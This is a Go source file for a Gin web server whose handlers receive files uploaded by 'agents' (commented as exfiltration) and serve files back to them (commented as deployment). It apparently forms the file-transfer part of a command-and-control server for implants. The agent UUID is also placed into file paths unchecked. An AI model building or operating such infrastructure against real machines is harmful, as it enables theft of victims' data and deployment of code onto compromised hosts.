package services

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"os"
	"path/filepath"
)

// Config
const StoragePath = "./storage/agent_files"

func InitTransfer() {
	// Ensure storage directory exists
	os.MkdirAll(StoragePath, 0755)
}

// Handler: Agent Uploads File (Exfiltration)
// POST /api/transfer/upload
func HandleAgentUpload(c *gin.Context) {
	// 1. Get the file from Multipart form
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file found"})
		return
	}

	uuid := c.PostForm("uuid")
	if uuid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent UUID is required"})
		return
	}

	// 2. Save file directly to disk (Isolated by UUID)
	filename := filepath.Base(file.Filename)
	agentDir := filepath.Join(StoragePath, uuid)
	os.MkdirAll(agentDir, 0755)
	
	savePath := filepath.Join(agentDir, filename)

	if err := c.SaveUploadedFile(file, savePath); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save file"})
		return
	}

	fmt.Printf("[+] File Received from Agent %s: %s\n", uuid, savePath)
	c.JSON(http.StatusOK, gin.H{"status": "success", "path": savePath})
}

// Handler: Agent Downloads File (Deployment)
// GET /api/transfer/download/:filename
func HandleAgentDownload(c *gin.Context) {
	filename := filepath.Base(c.Param("filename"))
	uuid := c.Query("uuid") // Expect UUID for isolation
	
	if filename == "." || filename == ".." || filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}
	
	targetPath := ""
	if uuid != "" {
		targetPath = filepath.Join(StoragePath, uuid, filename)
	} else {
		targetPath = filepath.Join(StoragePath, filename)
	}

	// Check if file exists
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	// Serve file (Gin handles streaming efficiently)
	c.File(targetPath)
}
